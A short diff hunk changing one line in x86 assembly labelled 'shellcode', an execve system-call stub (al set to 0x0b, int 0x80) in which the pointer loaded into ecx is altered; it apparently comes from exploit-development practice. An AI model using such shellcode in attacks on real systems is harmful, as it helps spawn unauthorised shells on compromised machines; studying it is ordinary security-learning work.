@@ -36,7 +36,7 @@ shellcode:
      mov byte al, 0x0b
      mov ebx, esi
      ;lea ecx, [esi + 8]
-     lea ecx, [esi]
+     lea ecx, [esp - 4]
      lea edx, [esi + 12]
      int 0x80
 arg3:
